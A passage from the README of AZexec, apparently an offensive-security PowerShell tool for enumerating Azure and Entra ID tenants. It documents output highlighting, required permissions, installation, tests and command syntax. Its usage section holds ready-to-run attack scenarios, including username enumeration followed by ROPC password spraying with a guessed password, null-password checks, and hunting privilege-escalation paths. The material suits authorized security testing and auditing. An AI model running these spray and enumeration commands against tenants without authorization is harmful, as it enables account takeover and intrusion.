        [-] Microsoft Graph : RoleManagement.ReadWrite.Directory (ID: ...)  # RED
        [-] Microsoft Graph : User.Read.All (ID: ...)  # Normal color
```

#### `roles` - Role Assignments
**Red highlights:**
- **Privileged role assignments**:
  - Global Administrator
  - Privileged Role Administrator
  - Security Administrator
  - Application Administrator
  - Privileged Authentication Administrator
  - User Administrator
  - Exchange Administrator
  - SharePoint Administrator
  - And other high-privilege roles
- Both active and PIM-eligible assignments

**Example output:**
```powershell
AZR         admin@example.com                  443    Global Administrator          [*] (privileged:True)  # RED
AZR         user@example.com                   443    Directory Readers             [*] (privileged:False)  # GREEN
```

#### `groups` - Group Enumeration
**Red highlights:**
- **Privileged/administrative security groups** based on name patterns:
  - Groups containing: admin, administrator, admins, global, privileged, security
  - Domain/Enterprise admins patterns
  - Root, sudo, wheel (Unix-style admin groups)
  - Helpdesk, tier, PIM (privileged access groups)

**Example output:**
```powershell
AZR         abc123...       443    Global Administrators        [*] (security:True) (members:5)  # RED
AZR         def456...       443    Marketing Team               [*] (security:True) (members:12) # GREEN
```

#### `apps` - Application Enumeration
**Red highlights:**
- Applications and service principals requesting **high-risk Microsoft Graph permissions**:
  - `Directory.ReadWrite.All` (ID: 19dbc75e-c2e2-444c-a770-ec69d8559fc7)
  - `Application.ReadWrite.All` (ID: 1bfefb4e-e0b5-418b-a88f-73c46d2cc8e9)
  - `AppRoleAssignment.ReadWrite.All` (ID: 06b708a9-e830-4db3-a914-8e69da51d44f)
  - `RoleManagement.ReadWrite.Directory` (ID: 9e3f62cf-ca93-4989-b6ce-bf83c28f9fe8)
- Summary statistics show count of apps with dangerous permissions

**Yellow highlights:**
- Password-only credentials (weaker security)
- ROPC-enabled public clients (vulnerable to password spray)

#### `vuln-list` - Vulnerability Enumeration
**Red highlights:**
- **HIGH risk** findings:
  - ROPC enabled (password spray possible)
  - Service principals with password-only credentials
  - Legacy authentication not blocked
  - Applications with dangerous permissions
  - Guest access same as members
  - Users without MFA registered

**Yellow highlights:**
- **MEDIUM risk** findings:
  - Implicit OAuth flow enabled
  - Stale guest accounts
  - Public client applications
  - Missing security defaults

#### `guest-vuln-scan` - Guest Vulnerability Scanner
**Red highlights:**
- **CRITICAL risk** vulnerabilities (Risk Score ≥ 70):
  - Guests have same permissions as members
  - Full directory enumeration possible by external users
- **HIGH risk** vulnerabilities (Risk Score ≥ 40):
  - Guests can enumerate users, groups, devices, applications, or directory roles
  - Azure "null session" equivalent exploitable

**Yellow highlights:**
- **MEDIUM risk** vulnerabilities
- Risk scores between 20-39

#### `user-profiles` - User Profile Enumeration
**Yellow highlights:**
- Guest users (external accounts)

**Green highlights:**
- Active member users

**DarkGray highlights:**
- Disabled user accounts

#### `hosts` - Device Enumeration
**Yellow highlights:**
- Non-compliant devices
- Devices failing compliance checks

**Cyan highlights:**
- Compliant, enabled devices

**DarkGray highlights:**
- Disabled devices

### Benefits of Red Highlighting

1. **Immediate Threat Identification**: Security-critical items stand out instantly in large result sets
2. **Efficient Triage**: Focus your attention on the most dangerous configurations first
3. **Better Reporting**: Screenshots with red highlights clearly demonstrate risks to stakeholders
4. **Consistent Experience**: Same color scheme across all commands reduces cognitive load
5. **Penetration Testing Efficiency**: Quickly identify privilege escalation paths and attack surfaces

### Disabling Colors

If you prefer plain text output (for scripting or logging), colors respect PowerShell's output stream configuration and can be redirected normally. Exported files (CSV/JSON) contain data without color codes.

## 📚 Additional Documentation

- **[Complete Password Spray Attack Guide](PASSWORD-SPRAY.md)** - Comprehensive documentation for GetCredentialType enumeration + ROPC password spraying
- **[Notes & Roadmap](notes.md)** - Planned features and implementation status

## 📋 Requirements

- **PowerShell 7+** (PowerShell Core)
- **Internet Connection**: Required for API access

**Note**: All authenticated commands automatically check for Microsoft Graph connection and connect if needed. You don't need to manually run `Connect-MgGraph` before running commands.

### For Device Enumeration (hosts command):
- **Microsoft.Graph PowerShell Module** (automatically installed if missing)
- **Automatically connects if disconnected** (requires appropriate permissions)
- **Azure/Entra ID Permissions**: 
  - Minimum: `Device.Read.All` scope
  - For owner enumeration: Additional directory read permissions may be required

### For Group Enumeration (groups command):
- **Microsoft.Graph PowerShell Module** (automatically installed if missing)
- **Automatically connects if disconnected** (requires appropriate permissions)
- **Azure/Entra ID Permissions**:
  - Minimum: `Group.Read.All` or `Directory.Read.All` scope
  - Guest users may have restricted access depending on tenant settings

### For Password Policy Enumeration (pass-pol command):
- **Microsoft.Graph PowerShell Module** (automatically installed if missing)
- **Automatically connects if disconnected** (requires appropriate permissions)
- **Azure/Entra ID Permissions**:
  - Minimum: `Organization.Read.All` and `Directory.Read.All` scopes
  - For full policy details: `Policy.Read.All` scope recommended
  - Guest users typically cannot view Conditional Access policies

### For Tenant Discovery (tenant command):
- **No authentication required** - Uses public OpenID configuration endpoints

### For Username Enumeration (users command):
- **No authentication required** - Uses public GetCredentialType API endpoint

### For User Profile Enumeration (user-profiles command):
- **Microsoft.Graph PowerShell Module** (automatically installed if missing)
- **Automatically connects if disconnected** (requires appropriate permissions)
- **Azure/Entra ID Permissions**:
  - Minimum: `User.Read.All` or `Directory.Read.All` scope
  - For sign-in activity: `AuditLog.Read.All` scope (optional but recommended)
  - Guest users may have restricted access depending on tenant settings

### For Guest Login Enumeration (guest command):
- **No authentication required** - Uses public ROPC OAuth2 endpoint
- Tests credentials against Azure/Entra ID authentication endpoints
- Detects MFA requirements, account lockouts, and password expiration

### For Active Session Enumeration (sessions command):
- **Authentication required** - Uses Microsoft Graph API
- **Microsoft.Graph PowerShell Module** (automatically installed if missing)
- **Automatically connects if disconnected** (requires appropriate permissions)
- **Azure/Entra ID Permissions**:
  - `AuditLog.Read.All` - Query sign-in logs (required)
  - `Directory.Read.All` - Access directory information
- **Note**: Guest users typically cannot access audit logs (expected behavior)
- Queries sign-in logs from the last 24 hours by default

### For Azure VM Logged-On Users Enumeration (vm-loggedon command):
- **Authentication required** - Uses Azure Management API
- **Az PowerShell Module** (automatically installed if missing)
  - `Az.Accounts` - Azure authentication
  - `Az.Compute` - VM management and Run Command
  - `Az.Resources` - Resource group enumeration
- **Automatically connects if disconnected** (requires Azure authentication)
- **Azure Permissions**:
  - `Virtual Machine Contributor` role (full VM access) OR
  - `Reader` role + `Virtual Machine Command Executor` role (minimal permissions)
  - Requires permissions on subscription or resource group level
- **VM Requirements**:
  - VMs must be in 'running' state to query logged-on users
  - VM Guest Agent must be installed and running
  - Works with both Windows and Linux VMs
- **Note**: This is the Azure equivalent of Remote Registry Service enumeration for on-premises environments

### For Vulnerable Target Enumeration (vuln-list command):
- **Hybrid approach**: Performs unauthenticated checks first, then authenticated enumeration
- **Microsoft.Graph PowerShell Module** (automatically installed if missing)
- **Azure/Entra ID Permissions** (for authenticated phase):
  - `Application.Read.All` - Enumerate service principals and apps
  - `Directory.Read.All` - Enumerate guest users and OAuth grants
  - `Policy.Read.All` - Check Conditional Access, Security Defaults, and guest permission policy
  - `AuditLog.Read.All` - Check user MFA registration status
- **Unauthenticated checks** work without any credentials (tenant config, ROPC status, legacy auth endpoints)

### For Application Enumeration (apps command):
- **Authentication required** - Uses Microsoft Graph API
- **Microsoft.Graph PowerShell Module** (automatically installed if missing)
- **Azure/Entra ID Permissions**:
  - `Application.Read.All` - Read all application registrations and enterprise applications (required)
  - `Directory.Read.All` - Read directory data (alternative permission)
- **Note**: Guest users may have restricted access depending on tenant settings
- Automatically connects if disconnected (requires appropriate permissions)
- Enumerates both application registrations and service principals (SPNs)
- Identifies security risks: password-only credentials, ROPC-enabled apps

### For Service Principal Discovery (sp-discovery command):
- **Authentication required** - Uses Microsoft Graph API
- **Microsoft.Graph PowerShell Module** (automatically installed if missing)
- **Azure/Entra ID Permissions**:
  - `Application.Read.All` - Read all service principals and applications (required)
  - `Directory.Read.All` - Read directory data (required)
  - `AppRoleAssignment.ReadWrite.All` - Optional write permission (use `-IncludeWritePermissions` flag)
    - **Note**: Script only performs read operations; this permission is typically unnecessary
    - By default, the script requests only read permissions following the principle of least privilege
- **Note**: Guest users may have restricted access depending on tenant settings
- Automatically connects if disconnected (requires appropriate permissions)
- Discovers service principals with their full permission assignments
- Maps app roles (application permissions) and OAuth2 grants (delegated permissions)
- Identifies owners and security risks

### For Role Assignments Enumeration (roles command):
- **Authentication required** - Uses Microsoft Graph API
- **Microsoft.Graph PowerShell Module** (automatically installed if missing)
- **Automatically connects if disconnected** (requires appropriate permissions)
- **Azure/Entra ID Permissions**:
  - `RoleManagement.Read.Directory` - Read directory role assignments (required)
  - `Directory.Read.All` - Read directory data (required)
  - `RoleEligibilitySchedule.Read.Directory` - Read PIM eligible assignments (optional, requires Azure AD Premium P2)
- **Note**: Guest users typically cannot view role assignments depending on tenant settings
- Enumerates active directory roles and their members
- Lists privileged accounts and group-based role assignments
- Displays PIM (Privileged Identity Management) eligible assignments if available

### For Conditional Access Policy Review (ca-policies command):
- **Authentication required** - Uses Microsoft Graph API
- **Microsoft.Graph PowerShell Module** (automatically installed if missing)
- **Automatically connects if disconnected** (requires appropriate permissions)
- **Azure/Entra ID Permissions**:
  - `Policy.Read.All` - Read conditional access policies (required)
  - `Directory.Read.All` - Read directory data (required)
- **Note**: **Guest users CANNOT access conditional access policies** - This command requires a member account
- Reviews all conditional access policies with detailed conditions analysis
- Displays policy state (enabled, disabled, report-only)
- Shows grant controls (MFA, compliant device, approved app, etc.)
- Displays session controls and risk-based conditions
- Provides security recommendations and highlights high-risk policies

## 🚀 Installation

1. **Clone the repository**:
```bash
git clone https://github.com/Logisek/AZexec.git
cd AZexec
```

2. **Ensure PowerShell 7+ is installed**:
```powershell
$PSVersionTable.PSVersion
```

3. **Run the script** (Microsoft.Graph module will be installed automatically on first run if needed):
```powershell
.\azx.ps1 hosts
```

## 🗂️ Project Structure

AZexec follows a modular architecture where functionality is organized into separate files:

```
AZexec/
├── azx.ps1                          # Main script - command routing and initialization
├── Functions/
│   ├── Core.ps1                     # Core utilities and Graph module management
│   ├── UI.ps1                       # Banner and help display functions
│   ├── Devices.ps1                  # hosts command - device enumeration
│   ├── Users.ps1                    # users & user-profiles commands
│   ├── Groups.ps1                   # groups command - group enumeration
│   ├── Applications.ps1             # apps command - application enumeration
│   ├── ServicePrincipals.ps1        # sp-discovery command - service principal discovery
│   ├── Roles.ps1                    # roles command - role assignment enumeration
│   ├── Policies.ps1                 # pass-pol & ca-policies commands
│   ├── Guest.ps1                    # guest command - guest authentication testing
│   ├── Sessions.ps1                 # sessions & vm-loggedon commands
│   ├── Tenant.ps1                   # tenant command - tenant discovery
│   ├── Vulnerabilities.ps1          # vuln-list & guest-vuln-scan commands
│   └── AzureRM.ps1                  # Azure Resource Manager commands (storage-enum, keyvault-enum, network-enum)
├── test-commands.ps1                # Automated test suite for all commands
├── README.md                        # This file
└── LICENSE                          # GPL v3 license
```

### Command to Function Mapping

Each command in `azx.ps1` is implemented in a dedicated function file:

| Command | Function File | Function Name |
|---------|---------------|---------------|
| `hosts` | `Devices.ps1` | `Invoke-HostEnumeration` |
| `tenant` | `Tenant.ps1` | `Invoke-TenantDiscovery` |
| `users` | `Users.ps1` | `Invoke-UserEnumeration` |
| `user-profiles` | `Users.ps1` | `Invoke-UserProfileEnumeration` |
| `groups` | `Groups.ps1` | `Invoke-GroupEnumeration` |
| `pass-pol` | `Policies.ps1` | `Invoke-PasswordPolicyEnumeration` |
| `guest` | `Guest.ps1` | `Invoke-GuestEnumeration` |
| `vuln-list` | `Vulnerabilities.ps1` | `Invoke-VulnListEnumeration` |
| `sessions` | `Sessions.ps1` | `Invoke-SessionEnumeration` |
| `guest-vuln-scan` | `Vulnerabilities.ps1` | `Invoke-GuestVulnScanEnumeration` |
| `apps` | `Applications.ps1` | `Invoke-ApplicationEnumeration` |
| `sp-discovery` | `ServicePrincipals.ps1` | `Invoke-ServicePrincipalDiscovery` |
| `roles` | `Roles.ps1` | `Invoke-RoleAssignmentEnumeration` |
| `ca-policies` | `Policies.ps1` | `Invoke-ConditionalAccessPolicyReview` |
| `vm-loggedon` | `Sessions.ps1` | `Invoke-VMLoggedOnUsersEnumeration` |
| `process-enum` | `AzureRM.ps1` | `Invoke-VMProcessEnumeration` |
| `storage-enum` | `AzureRM.ps1` | `Invoke-StorageEnumeration` |
| `keyvault-enum` | `AzureRM.ps1` | `Invoke-KeyVaultEnumeration` |
| `network-enum` | `AzureRM.ps1` | `Invoke-NetworkEnumeration` |
| `shares-enum` | `AzureRM.ps1` | `Invoke-SharesEnumeration` |
| `disks-enum` | `AzureRM.ps1` | `Invoke-DisksEnumeration` |
| `help` | `UI.ps1` | `Show-Help` |

This modular design makes the codebase easier to maintain, test, and extend with new commands.

### Azure Resource Manager (ARM) Commands

The following commands use Azure Resource Manager API (Az PowerShell modules) instead of Microsoft Graph. They all support **multi-subscription enumeration** by default:

| Command | Description | Required Modules | RBAC Role |
|---------|-------------|------------------|-----------|
| `vm-loggedon` | Enumerate logged-on users on Azure VMs | Az.Accounts, Az.Compute, Az.Resources | VM Contributor or Reader + VM Command Executor |
| `storage-enum` | Enumerate Storage Accounts with security analysis | Az.Accounts, Az.Resources, Az.Storage | Reader (Storage Account Contributor for full details) |
| `keyvault-enum` | Enumerate Key Vaults with security analysis | Az.Accounts, Az.Resources, Az.KeyVault | Reader (Key Vault Reader for full details) |
| `network-enum` | Enumerate VNets, NSGs, Public IPs, Load Balancers, Network Interfaces | Az.Accounts, Az.Resources, Az.Network | Reader |
| `shares-enum` | Enumerate Azure File Shares (mimics nxc --shares) | Az.Accounts, Az.Resources, Az.Storage | Reader + Storage Account Key Operator or Storage File Data SMB Share Reader |
| `disks-enum` | Enumerate Azure Managed Disks (mimics nxc --disks) | Az.Accounts, Az.Resources, Az.Compute | Reader (Disk Reader or Contributor for full details) |
| `bitlocker-enum` | Enumerate BitLocker encryption status on Intune devices + Azure VMs (mimics nxc -M bitlocker) | Microsoft.Graph (Intune) + Az.Accounts, Az.Compute, Az.Resources (VMs) | DeviceManagementManagedDevices.Read.All (Intune) + VM Contributor (Azure VMs) |
| `process-enum` | Enumerate remote processes on Azure VMs (mimics nxc smb --tasklist) | Az.Accounts, Az.Compute, Az.Resources | VM Contributor or Reader + VM Command Executor |
| `lockscreen-enum` | Detect lockscreen backdoors on Azure VMs (mimics nxc smb -M lockscreendoors) | Az.Accounts, Az.Compute, Az.Resources | VM Contributor or Reader + VM Command Executor |

**Multi-Subscription Support**: All ARM commands automatically enumerate all accessible subscriptions. Use `-SubscriptionId` to target a specific subscription, or `-ResourceGroup` to filter within subscriptions.

## 🧪 Testing

AZexec includes an automated test suite to verify all commands execute without parameter errors.

### Running the Test Suite

```powershell
# Run automated tests for all commands
.\test-commands.ps1
```

The test script will:
- Execute each command with no parameters
- Verify the command is recognized and executes properly
- Report execution time for each command
- Identify commands that require authentication (expected to timeout waiting for auth)
- Display a summary with pass/fail status

### Test Output Example

```
========================================
  AZexec Command Test Suite
  Testing 16 commands
========================================

[*] Testing command: hosts ... PASS (Auth Required)
[*] Testing command: tenant ... PASS
[*] Testing command: users ... PASS
[*] Testing command: user-profiles ... PASS (Auth Required)
[*] Testing command: groups ... PASS (Auth Required)
[*] Testing command: pass-pol ... PASS (Auth Required)
[*] Testing command: guest ... PASS
[*] Testing command: vuln-list ... PASS
[*] Testing command: sessions ... PASS (Auth Required)
[*] Testing command: guest-vuln-scan ... PASS
[*] Testing command: apps ... PASS (Auth Required)
[*] Testing command: sp-discovery ... PASS (Auth Required)
[*] Testing command: roles ... PASS (Auth Required)
[*] Testing command: ca-policies ... PASS (Auth Required)
[*] Testing command: vm-loggedon ... PASS (Auth Required)
[*] Testing command: process-enum ... PASS (Auth Required)
[*] Testing command: storage-enum ... PASS (Auth Required)
[*] Testing command: keyvault-enum ... PASS (Auth Required)
[*] Testing command: network-enum ... PASS (Auth Required)
[*] Testing command: help ... PASS

========================================
  TEST SUMMARY
========================================

Command         Status      Duration
-------         ------      --------
hosts           PASS        3.54s
tenant          PASS        2.06s
users           PASS        0.44s
user-profiles   PASS        3.41s
groups          PASS        4.59s
pass-pol        PASS        6.76s
guest           PASS        2.21s
vuln-list       PASS        15.81s
sessions        PASS        5.00s
guest-vuln-scan PASS        9.00s
apps            PASS        6.65s
sp-discovery    PASS (Auth) 30.21s
roles           PASS        20.24s
ca-policies     PASS        5.20s
vm-loggedon     PASS (Auth) 54.46s
process-enum    PASS (Auth) 48.32s
storage-enum    PASS (Auth) 32.15s
keyvault-enum   PASS (Auth) 28.92s
network-enum    PASS (Auth) 35.67s
help            PASS        0.49s

Total: 19 | Passed: 19 | Failed: 0

All commands executed successfully!
```

### What the Tests Verify

- ✅ All commands are properly registered in the ValidateSet
- ✅ Command routing works correctly in the main script
- ✅ Function files are loaded successfully
- ✅ Commands execute without parameter errors
- ✅ Authentication prompts appear for commands requiring auth
- ✅ Help system displays available commands

**Note**: The test suite verifies command structure and execution, not functional correctness. It ensures the tool doesn't have breaking changes after structural modifications.

## 📖 Usage

### Quick Reference: Attack Scenarios

**Getting Started**
```powershell
.\azx.ps1 help                              # Display all available commands
```

**Scenario 1: External Reconnaissance (No Credentials)**
```powershell
.\azx.ps1 tenant -Domain target.com          # Discover tenant config
.\azx.ps1 users -Domain target.com -CommonUsernames  # Enumerate valid usernames
.\azx.ps1 guest -Domain target.com           # Check if tenant accepts guests
```

**Scenario 1b: Password Spray Attack (Complete Workflow)**
```powershell
# Phase 1: Enumerate valid usernames with GetCredentialType API (no auth, no logs)
.\azx.ps1 users -Domain target.com -CommonUsernames -ExportPath valid-users.csv

# Phase 2: Extract valid usernames for spraying
$validUsers = Import-Csv valid-users.csv | Where-Object { $_.Exists -eq 'True' } | Select-Object -ExpandProperty Username
$validUsers | Out-File -FilePath spray-targets.txt

# Phase 3: Password spray with ROPC authentication
.\azx.ps1 guest -Domain target.com -UserFile spray-targets.txt -Password 'Summer2024!' -ExportPath spray-results.json

# Review results - look for valid credentials, MFA-enabled accounts, and locked accounts
Get-Content spray-results.json | ConvertFrom-Json | Select -ExpandProperty AuthResults | Where-Object { $_.Success -eq $true }
```

**Scenario 1c: Quick Null Password Testing (Like nxc smb -u 'a' -p '')**
```powershell
.\azx.ps1 guest                                                    # Check current tenant (auto-detect)
.\azx.ps1 guest -Domain target.com -Username user -Password ''     # Test null password
.\azx.ps1 guest -UserFile users.txt -Password 'Summer2024!'        # Password spray (auto-detect domain)
```

**Scenario 2: Guest User Enumeration (Low-Privilege Access)**
```powershell
# The "Azure Null Session" - most powerful low-noise technique
.\azx.ps1 hosts                              # Login with guest credentials
.\azx.ps1 user-profiles -ExportPath users.csv  # Enumerate user profiles
.\azx.ps1 groups                             # Enumerate groups
.\azx.ps1 hosts -ShowOwners -ExportPath enum.json  # Full enumeration
```

**Scenario 2b: Guest User Vulnerability Assessment**
```powershell
# Automated guest permission security scanner
.\azx.ps1 guest-vuln-scan                    # Scan current tenant (auto-detect)
.\azx.ps1 guest-vuln-scan -Domain target.com # Scan specific tenant
.\azx.ps1 guest-vuln-scan -ExportPath guest-vuln-report.json  # Full report with risk scoring

# This command performs:
# - Unauthenticated checks (external collaboration enabled?)
# - Authenticated checks (guest permission boundaries)
# - Risk scoring and vulnerability assessment
# - Actionable remediation recommendations
```

**Scenario 3: Member Account Enumeration (Full Access)**
```powershell
.\azx.ps1 hosts -Scopes "User.Read.All,Device.Read.All,Group.Read.All"
.\azx.ps1 hosts -Filter noncompliant         # Find weak security posture
.\azx.ps1 pass-pol                           # Check password policies
```

**Scenario 4: Vulnerability Assessment (Like nxc smb --gen-relay-list)**
```powershell
# The Azure equivalent of finding SMB hosts without signing
.\azx.ps1 vuln-list                          # Full vuln assessment (domain auto-detected)
.\azx.ps1 vuln-list -Domain target.com       # Target specific tenant
.\azx.ps1 vuln-list -ExportPath relay.txt    # Export HIGH risk targets (relay-list style)
.\azx.ps1 vuln-list -ExportPath full.json    # Export all findings as JSON
```

**Scenario 5: Active Session Monitoring (Like nxc smb --qwinsta)**
```powershell
# Enumerate active sign-in sessions - the cloud equivalent of qwinsta
.\azx.ps1 sessions                           # Last 24 hours (default)
.\azx.ps1 sessions -Hours 168                # Last 7 days
.\azx.ps1 sessions -Username alice@corp.com  # Track specific user
.\azx.ps1 sessions -Hours 1                  # Real-time monitoring (last hour)
.\azx.ps1 sessions -Hours 720 -ExportPath audit.csv  # 30-day audit (requires Premium)
```

**Scenario 5b: Azure VM Logged-On Users Enumeration (Like nxc smb --logged-on-users)**
```powershell
# Enumerate logged-on users on Azure VMs - the Azure equivalent of Workstation Service (wkssvc)
.\azx.ps1 vm-loggedon                        # All VMs in current subscription
.\azx.ps1 vm-loggedon -ResourceGroup Prod-RG # Specific resource group
.\azx.ps1 vm-loggedon -VMFilter running      # Only running VMs
.\azx.ps1 vm-loggedon -SubscriptionId "12345678-1234-1234-1234-123456789012"  # Specific subscription
.\azx.ps1 vm-loggedon -ResourceGroup Prod-RG -ExportPath loggedon.csv  # Export to CSV
.\azx.ps1 vm-loggedon -ExportPath users.json # Full details as JSON

# This command is the Azure equivalent of:
# nxc smb 192.168.1.0/24 -u UserName -p 'PASSWORDHERE' --loggedon-users
#
# What it does:
# - Enumerates Azure VMs (like nxc smb 10.10.10.0/24)
# - Queries logged-on users via VM Run Command (like Workstation Service wkssvc)
# - Shows username, session state, idle time, and connection source
# - Works with both Windows and Linux VMs
# - Multi-subscription support with automatic enumeration
```

**Scenario 5c: Azure Storage Account Security Audit (Multi-Subscription)**
```powershell
# Enumerate storage accounts across ALL accessible subscriptions
.\azx.ps1 storage-enum                        # Auto-enumerate all subscriptions
.\azx.ps1 storage-enum -ResourceGroup Prod-RG # Filter by resource group
.\azx.ps1 storage-enum -SubscriptionId "12345678-..."  # Target specific subscription
.\azx.ps1 storage-enum -ExportPath storage-audit.html  # Export HTML security report

# Security checks performed:
# - Blob public access enabled (HIGH risk)
# - HTTPS-only disabled (MEDIUM risk)
# - Network allows all (MEDIUM risk)
# - TLS version < 1.2 (LOW risk)
# - Shared key access enabled (LOW risk)
```

**Scenario 5d: Azure Key Vault Security Audit (Multi-Subscription)**
```powershell
# Enumerate Key Vaults across ALL accessible subscriptions
.\azx.ps1 keyvault-enum                       # Auto-enumerate all subscriptions
.\azx.ps1 keyvault-enum -ResourceGroup Security-RG    # Filter by resource group
.\azx.ps1 keyvault-enum -SubscriptionId "12345678-..."  # Target specific subscription
.\azx.ps1 keyvault-enum -ExportPath keyvault-audit.json  # Export JSON for analysis

# Security checks performed:
# - Soft delete disabled (MEDIUM risk)
# - Purge protection disabled (LOW risk)
# - RBAC authorization disabled (LOW risk)
# - Public network access enabled (MEDIUM risk)
# - Many access policies (>10)
```

**Scenario 5e: Azure Network Security Audit (Multi-Subscription)**
```powershell
# Enumerate network resources across ALL accessible subscriptions
.\azx.ps1 network-enum                        # Auto-enumerate all subscriptions
.\azx.ps1 network-enum -ResourceGroup Prod-RG # Filter by resource group
.\azx.ps1 network-enum -SubscriptionId "12345678-..."  # Target specific subscription
.\azx.ps1 network-enum -ExportPath network-audit.csv  # Export CSV for spreadsheet

# Resources enumerated:
# - Virtual Networks (VNets) - address spaces, subnets, peerings
# - Network Security Groups (NSGs) - security rules, risky inbound rules
# - Public IP Addresses - allocation, association status
# - Load Balancers - frontend IPs, backend pools, rules

# Security checks performed:
# - Risky NSG inbound rules (HIGH risk) - open ports from Internet
# - Unassociated Public IPs (MEDIUM risk) - misconfiguration indicator
```

**Scenario 5f: Azure File Shares Enumeration (Like nxc smb --shares)**
```powershell
# Enumerate Azure File Shares - the Azure equivalent of SMB share enumeration
.\azx.ps1 shares-enum                        # All shares across all subscriptions
.\azx.ps1 shares-enum -SharesFilter WRITE    # Only shares with WRITE access
.\azx.ps1 shares-enum -SharesFilter READ,WRITE  # Shares with both READ and WRITE
.\azx.ps1 shares-enum -SharesFilter READ     # Only shares with READ access
.\azx.ps1 shares-enum -ResourceGroup Prod-RG # Filter by resource group
.\azx.ps1 shares-enum -ExportPath shares.csv # Export to CSV

# This command is the Azure equivalent of:
# nxc smb 192.168.1.0/24 -u user -p 'PASSWORDHERE' --shares
# nxc smb 192.168.1.0/24 -u user -p 'PASSWORDHERE' --shares READ,WRITE

# What it does:
# - Enumerates Azure File Shares across Storage Accounts
# - Shows access permissions (READ, WRITE) like SMB share access
# - Displays quota, access tier, and protocol (SMB/NFS)
# - Identifies writable shares (potential data upload risk)
# - Flags shares in publicly accessible storage accounts
```

**Scenario 6: Service Principal Permission Discovery**
```powershell
# Discover service principals with their permissions and ownership
.\azx.ps1 sp-discovery                       # Enumerate all service principals with permissions (read-only by default)
.\azx.ps1 sp-discovery -ExportPath sp-perms.csv     # Export to CSV for analysis
.\azx.ps1 sp-discovery -ExportPath sp-perms.json    # Export full details to JSON
.\azx.ps1 sp-discovery -IncludeWritePermissions     # Include AppRoleAssignment.ReadWrite.All permission (optional)

# Use case: Identify privilege escalation paths through service principals
# - Find SPNs with high-risk permissions (RoleManagement, Directory.ReadWrite)
# - Discover password-only credentials (vulnerable to theft)
# - Map out who owns which service principals
# - Identify OAuth2 permissions granted to applications
```

**Scenario 7: Directory Role Assignments and Privileged Account Discovery**
```powershell
# Enumerate all directory role assignments
.\azx.ps1 roles                              # List all role assignments and privileged accounts
.\azx.ps1 roles -ExportPath roles.csv        # Export to CSV for compliance review
.\azx.ps1 roles -ExportPath roles.json       # Export full details including PIM assignments

# Use case: Privileged access review and security audit
# - 🔴 Privileged roles (Global Admin, Security Admin, etc.) are highlighted in RED
# - Identify Global Administrators and other privileged roles
# - Discover group-based role assignments (potential privilege escalation)
# - Find service principals with directory roles
# - Review PIM (Privileged Identity Management) eligible assignments
# - Detect excessive privileged accounts for security compliance
```

### Basic Syntax

```powershell
# Device enumeration
.\azx.ps1 hosts [-Filter <FilterType>] [-ShowOwners] [-NoColor] [-ExportPath <Path>] [-Scopes <Scopes>]

# Tenant discovery (auto-detects domain if not specified)
.\azx.ps1 tenant [-Domain <DomainName>] [-NoColor] [-ExportPath <Path>]

# Username enumeration (no authentication required, auto-detects domain if not specified)
.\azx.ps1 users [-Domain <DomainName>] [-Username <User>] [-UserFile <Path>] [-CommonUsernames] [-NoColor] [-ExportPath <Path>]

# User profile enumeration (authentication required)
.\azx.ps1 user-profiles [-NoColor] [-ExportPath <Path>]

# Group enumeration (authentication required)
.\azx.ps1 groups [-ShowOwners] [-NoColor] [-ExportPath <Path>]

# Password policy enumeration (authentication required)
.\azx.ps1 pass-pol [-NoColor] [-ExportPath <Path>]

# Guest login enumeration (like nxc smb -u 'a' -p '') - domain auto-detected if not specified
.\azx.ps1 guest [-Domain <DomainName>] [-Username <User>] [-Password <Password>] [-UserFile <Path>] [-NoColor] [-ExportPath <Path>]

# Active session enumeration (like nxc smb --qwinsta) - authentication required
.\azx.ps1 sessions [-Username <User>] [-Hours <Hours>] [-NoColor] [-ExportPath <Path>]

# Azure VM logged-on users (like nxc smb --logged-on-users / Remote Registry Service) - Azure authentication required
.\azx.ps1 vm-loggedon [-ResourceGroup <RGName>] [-SubscriptionId <SubId>] [-VMFilter <all|running|stopped>] [-NoColor] [-ExportPath <Path>]

# Azure Storage Account enumeration (multi-subscription support) - Azure authentication required
.\azx.ps1 storage-enum [-ResourceGroup <RGName>] [-SubscriptionId <SubId>] [-ExportPath <Path>]

# Azure Key Vault enumeration (multi-subscription support) - Azure authentication required
.\azx.ps1 keyvault-enum [-ResourceGroup <RGName>] [-SubscriptionId <SubId>] [-ExportPath <Path>]

# Azure Network resource enumeration (multi-subscription support) - Azure authentication required
.\azx.ps1 network-enum [-ResourceGroup <RGName>] [-SubscriptionId <SubId>] [-ExportPath <Path>]

# Azure File Shares enumeration (multi-subscription support) - Azure authentication required
.\azx.ps1 shares-enum [-ResourceGroup <RGName>] [-SubscriptionId <SubId>] [-SharesFilter <all|READ|WRITE|READ,WRITE>] [-ExportPath <Path>]

# Azure Managed Disks enumeration (multi-subscription support) - Azure authentication required
.\azx.ps1 disks-enum [-ResourceGroup <RGName>] [-SubscriptionId <SubId>] [-ExportPath <Path>]

# BitLocker enumeration on Windows VMs (multi-subscription support) - Azure authentication required
.\azx.ps1 bitlocker-enum [-ResourceGroup <RGName>] [-SubscriptionId <SubId>] [-VMFilter <all|running|stopped>] [-ExportPath <Path>]

# Process enumeration on Azure VMs (multi-subscription support) - Azure authentication required
.\azx.ps1 process-enum [-ResourceGroup <RGName>] [-SubscriptionId <SubId>] [-VMFilter <all|running|stopped>] [-ProcessName <ProcessName>] [-ExportPath <Path>]

# Vulnerable target enumeration (like nxc smb --gen-relay-list) - domain auto-detected if not specified
.\azx.ps1 vuln-list [-Domain <DomainName>] [-NoColor] [-ExportPath <Path>]

# Application and service principal enumeration (authentication required)
.\azx.ps1 apps [-NoColor] [-ExportPath <Path>]

# Service principal permission discovery (authentication required)
.\azx.ps1 sp-discovery [-NoColor] [-ExportPath <Path>] [-IncludeWritePermissions]

# Directory role assignments enumeration (authentication required)
.\azx.ps1 roles [-NoColor] [-ExportPath <Path>]

# Display help and available commands
.\azx.ps1 help

# Note: Add -Disconnect to any command to automatically disconnect from Microsoft Graph after execution
.\azx.ps1 hosts -Disconnect
.\azx.ps1 sp-discovery -ExportPath sp.json -Disconnect
```

### Parameters

| Parameter | Description | Required | Default |
|-----------|-------------|----------|---------|
| `Command` | Operation to perform: `hosts`, `tenant`, `users`, `user-profiles`, `groups`, `local-groups`, `pass-pol`, `guest`, `vuln-list`, `sessions`, `guest-vuln-scan`, `apps`, `sp-discovery`, `roles`, `help` | Yes | - |
| `Domain` | Domain name for tenant/user/guest discovery. Auto-detected from UPN, username, or environment if not provided | No | Auto-detect |
| `Filter` | Filter devices by criteria | No | `all` |
| `ShowOwners` | Display device/group owners (slower) | No | `False` |
